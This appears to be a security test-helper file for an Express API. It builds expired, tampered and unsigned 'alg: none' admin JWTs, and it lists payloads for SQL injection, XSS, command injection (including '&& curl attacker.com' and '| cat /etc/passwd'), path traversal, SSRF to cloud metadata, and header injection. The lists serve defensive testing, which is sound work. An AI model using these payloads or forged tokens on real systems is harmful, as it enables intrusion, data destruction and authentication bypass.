import { Express } from 'express'
import request from 'supertest'
import jwt from 'jsonwebtoken'
import { createServer } from '../../src/api/server'
import { generateToken } from '../../src/api/middleware/auth.middleware'

// Use env vars from setup.ts — keeps secrets coupled with server config
const TEST_SECRET = process.env.JWT_SECRET || 'test-jwt-secret-for-testing-only'
const TEST_API_KEY = process.env.API_KEY || 'test-api-key-12345'

export function createSecurityTestServer(): Express {
  return createServer()
}

export function validToken(sub = 'test-user', permissions = ['*']): string {
  return generateToken({ sub, permissions })
}

export function expiredToken(sub = 'test-user'): string {
  return jwt.sign(
    { sub, permissions: ['*'], exp: Math.floor(Date.now() / 1000) - 3600 },
    TEST_SECRET,
  )
}

export function tamperedToken(): string {
  const token = jwt.sign({ sub: 'admin', permissions: ['*'] }, 'wrong-secret')
  return token
}

export function noneAlgorithmToken(): string {
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url')
  const payload = Buffer.from(JSON.stringify({ sub: 'admin', permissions: ['*'] })).toString('base64url')
  return `${header}.${payload}.`
}

export function authedRequest(app: Express) {
  const token = validToken()
  return {
    get: (url: string) => request(app).get(url).set('Authorization', `Bearer ${token}`),
    post: (url: string) => request(app).post(url).set('Authorization', `Bearer ${token}`),
    put: (url: string) => request(app).put(url).set('Authorization', `Bearer ${token}`),
    delete: (url: string) => request(app).delete(url).set('Authorization', `Bearer ${token}`),
  }
}

export function apiKeyReq(app: Express) {
  return {
    get: (url: string) => request(app).get(url).set('X-API-Key', TEST_API_KEY),
    post: (url: string) => request(app).post(url).set('X-API-Key', TEST_API_KEY),
  }
}

export function tenantRequest(app: Express, tenantId: string) {
  const token = validToken()
  return {
    get: (url: string) =>
      request(app).get(url).set('Authorization', `Bearer ${token}`).set('X-Tenant-ID', tenantId),
    post: (url: string) =>
      request(app).post(url).set('Authorization', `Bearer ${token}`).set('X-Tenant-ID', tenantId),
  }
}

// SQL injection payloads
export const SQL_INJECTIONS = [
  "'; DROP TABLE users; --",
  "1' OR '1'='1",
  "1; SELECT * FROM information_schema.tables--",
  "' UNION SELECT null,null,null--",
  "1' AND 1=CONVERT(int,(SELECT @@version))--",
]

// XSS payloads
export const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  "javascript:alert('xss')",
  '<svg onload=alert(1)>',
  '{{constructor.constructor("return this")()}}',
]

// Command injection payloads
export const CMD_INJECTIONS = [
  '; ls -la',
  '| cat /etc/passwd',
  '$(whoami)',
  '`id`',
  '&& curl attacker.com',
]

// Path traversal payloads
export const PATH_TRAVERSALS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32',
  '%2e%2e%2f%2e%2e%2f',
  '....//....//....//etc/passwd',
  '%252e%252e%252f',
]

// SSRF private IP URLs
export const PRIVATE_URLS = [
  'http://127.0.0.1',
  'http://localhost',
  'http://10.0.0.1',
  'http://172.16.0.1',
  'http://192.168.1.1',
  'http://169.254.169.254', // AWS metadata
  'http://0.0.0.0',
  'http://[::1]',
  'http://internal.local',
  'http://service.internal',
]

// Header injection payloads
export const HEADER_INJECTIONS = [
  'value\r\nX-Injected: true',
  'value\nSet-Cookie: evil=1',
  'value\r\n\r\n<html>injected</html>',
]
